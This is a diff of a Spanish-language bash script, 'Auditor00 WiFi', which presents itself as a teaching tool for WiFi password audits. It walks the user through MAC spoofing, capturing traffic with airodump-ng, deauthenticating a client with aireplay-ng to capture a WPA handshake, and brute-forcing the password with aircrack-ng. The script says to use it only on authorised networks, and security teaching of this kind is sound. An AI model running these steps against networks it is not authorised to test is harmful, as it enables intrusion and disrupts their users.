@@ -1,12 +1,41 @@
 #!/bin/bash
-#               Cambia el archivo de salida por essid+date por ejemplo.
-#               Para que el pass.txt no pise el anterior.
-# I leave this boolean for jump intro.
-for i in {1..5}
-do
-echo $i
-done
-sleep 5
+
+#----
+
+# Functions:
+nextStep(){
+	read -n 1 -s -r -p "Presione cualquier tecla para continuar."
+}
+returnText(){
+	until [[ $WANSWER = "$1" ]]
+      do
+        echo -e "\n\n\e[93mEscriba correctamente\e[0m $1\n"
+        read WANSWER
+      done
+	echo -e "\nBien. Continuamos.\n"
+	echo -e "$1"
+	sleep 2
+}
+checkDeps(){
+	if command -v "$1" >/dev/null
+		then 
+			echo -e "\e[32m$2 is installed.\n\e[0m"
+			sleep 0.5
+		else
+			echo -e "\e[91m$2 doesn't exists.\n\e[0m"
+			sleep 0.5
+	fi
+}
+airodumpListening(){ 
+	sudo airodump-ng --essid $WESSID -c $WCHANNEL -w $WESSID $NIC
+}
+aireplayDeauth(){
+sleep 2
+sudo aireplay-ng -0 10 -e $WESSID -c $WSTATION $NIC
+}
+
+#----
+
 clear
 echo -e "\n\e[93mAuditor00<->\n\n\n\n"
 sleep 0.05
@@ -90,20 +119,18 @@ echo -e "\nAuditor00                          <->\n\n\n\n"
 sleep 0.05
 clear
 echo -e "\nAuditor00                           \e[5m*\n\n\n\n"
-sleep 3
+sleep 1.5
 clear
-echo -e "\e[0m\e[93m\n\n\n\e[93m----Bienvenido a Auditor00 WiFi.----"
-clear
-echo -e "\e[93m\n\n\n----Bienvenido a Auditor00 WiFi.----\n\nAuditor00 es una herramienta pedagógica sobre redes WiFi"
-clear
-echo -e "\e[93m\n\n\n----Bienvenido a Auditor00 WiFi.----\n\nAuditor00 es una herramienta pedagógica sobre redes WiFi\n\npero con la particularidad de que sus ejemplos prácticos...\n\n\n\e[0m"
+echo -e "\e[0m\e[93m\n\n\n----Bienvenido a Auditor00 WiFi.----\n\nAuditor00 es una herramienta pedagógica sobre redes WiFi\n\npero con la particularidad de que sus ejemplos prácticos...\n\n\n\e[0m"
 nextStep
-clear
-echo -e "\e[93m\n\n\n...son creados sobre la marcha en auditorías reales.\n\n\n\e[0m"
+echo -e "\n\n\e[93m...son creados en auditorías reales.\e[0m\n"
+nextStep
+echo -e "\e[93m\n\nSiga los pasos de Auditor00 ordenadamente y realizará una auditoría básica de weak passwords en su entorno.\n\n"
+echo -e "\e[5mATENCION: \e[0m\e[93mUTILICE ESTA HERRAMIENTA SOLO EN ENTORNOS AUTORIZADOS\n\e[0m"
 nextStep
 
 #----
-
+clear
 echo -e "\e[93m    _             _ _ _              ___   ___  "
 echo "   / \  _   _  __| (_) |_ ___  _ __ / _ \ / _ \ "
 echo "  / _ \| | | |/ _  | | __/ _ \|  __| | | | | | |"
@@ -114,39 +141,6 @@ echo -e "\e[0m----------MENU DE OPCIONES----------"
 echo -e "\e[7m(IMPORTANTE: seguir el orden numérico)"
 echo -e "\e[0m"
 
-#----
-
-# Functions:
-nextStep(){
-	read -n 1 -s -r -p "Presione cualquier tecla para continuar."
-}
-returnText(){
-	until [[ $WANSWER = "$1" ]]
-      do
-        echo -e "\n\n\e[93mEscriba\e[0m $1\n"
-        read WANSWER
-      done
-	echo -e "\nBien. Continuamos.\n"
-	echo -e "$1"
-	sleep 2
-}
-checkDeps(){
-	if command -v "$1" >/dev/null
-		then 
-			echo -e "\e[32m$2 is installed.\n\e[0m"
-			sleep 0.5
-		else
-			echo -e "\e[91m$2 doesn't exists.\n\e[0m"
-			sleep 0.5
-	fi
-}
-airodumpListening(){ 
-	sudo airodump-ng --essid $WESSID -c $WCHANNEL -w aVer $NIC
-}
-aireplayDeauth(){
-sleep 2
-sudo aireplay-ng -0 10 -e $WESSID -c $WSTATION $NIC
-}
 #----
 
 COLUMNS=12
@@ -220,8 +214,8 @@ do
               read MACAUDITOR
               clear
               echo -e "\n\e[93mLanzamos la instrucción \e[0mmacchanger -s $MACAUDITOR\n"
-		 	  ReturnText "macchanger -s $MACAUDITOR"
-              macchanger -s $MACAUDITOR
+		 	  returnText "sudo macchanger -s $MACAUDITOR"
+              sudo macchanger -s $MACAUDITOR
               echo ""
               echo -e "\e[93m Y aquí comprobamos ambas MAC.\n\e[0m"
               nextStep
@@ -229,9 +223,9 @@ do
               echo -e "\n\e[93mEl paso siguiente será elegir una nueva dirección MAC."
               echo -e "Escoja una palabra clave o una parte de ella. \nEjemplo: \e[0mApple, App, Tp-Link, Tp-, Ubiquiti, Ubi, Cisco, Cis, etc.\n"
               read KWMACAUDITOR
-              echo -e "\n\e[93mLanzamos \e[0mmacchanger -l | grep -i $KWMACAUDITOR\n"
-  			  returnText "macchanger -l | grep -i $KWMACAUDITOR"
-              macchanger -l $MACAUDITOR | grep -i $KWMACAUDITOR
+              echo -e "\n\e[93mLanzamos \e[0msudo macchanger -l | grep -i $KWMACAUDITOR\n"
+  			  returnText "sudo macchanger -l | grep -i $KWMACAUDITOR"
+              sudo macchanger -l $MACAUDITOR | grep -i $KWMACAUDITOR
               echo -e "\n\e[93mHemos lanzado \e[0mmacchanger -l | grep -i $KWMACAUDITOR"
               echo -e "\e[93mY esta de arriba es la lista con los resultados."
               echo -e "\nEl fabricante es identificado por las 3 primeras parejas y son las que respetaremos."
@@ -245,7 +239,7 @@ do
               read NUEVAMACAUDITOR
               clear
               echo -e "\n\e[93mEsta es su MAC actual\e[0m\n"
-              macchanger -s $MACAUDITOR
+              sudo macchanger -s $MACAUDITOR
               echo -e "\n\e[93mY esta va a ser su nueva MAC en la tarjeta $MACAUDITOR:\e[0m\n"
               NUEVAMACRANDOM="$NUEVAMACAUDITOR:a$(($RANDOM%10)):c$(($RANDOM%10)):d$(($RANDOM%10))"
               echo -e "$NUEVAMACRANDOM\n"
@@ -403,15 +397,15 @@ do
 			  aireplayDeauth
 			  sleep 15 && sudo killall airodump-ng
 			  if 
-				command aircrack-ng barbas.cap | grep "0 handshake" >/dev/null
+				command aircrack-ng $WESSID-01.cap | grep "0 handshake" >/dev/null
 			  		then
 						echo "Handshake no encontrado"
-						sudo rm aVer*
+						sudo rm $WESSID-01*
 						echo -e "Inténtelo nuevamente hasta lograrlo."
 						exit 0
 			  		else
 						echo "Handshake capturado."
-						aircrack-ng barbas.cap
+						aircrack-ng $WESSID-01.cap
 						echo -e "\nUna vez capturado el Handshake el siguiente paso es"
 						echo -e "evaluar la fortaleza de la contraseña escogida."
 						echo -e "\nContinúe a la opción 5 Descifrado por Fuerza bruta.\e[0m"
@@ -431,14 +425,14 @@ do
 			  echo -e "\nAñádalo por favor:\n"
 			  read WifiPATH
 			  clear
-			  returnText "aircrack-ng aVer.cap -w $WifiPATH"
+			  returnText "aircrack-ng $WESSID-01.cap -w $WifiPATH"
 			  echo -e "\e[93mSi en algún momento desea interrumpir el proceso"
 			  echo -e "pulse cualquier tecla.\n\n\n\e[0m"
         	  nextStep
 			  clear
 			  echo -e "\e[0maircrack-ng <FILE.CAP> -w $WifiPATH"
 			  sleep 4
-			  aircrack-ng aVer-01.cap -w $WifiPATH -l password.txt &
+			  aircrack-ng $WESSID-01.cap -w $WifiPATH -l $WESSID.txt &
 			  read -t 60 -n 1 -r -p "Presione r para parar el proceso. " RESPUESTA
 			  if [[ $RESPUESTA = "r" ]]
         	  	then
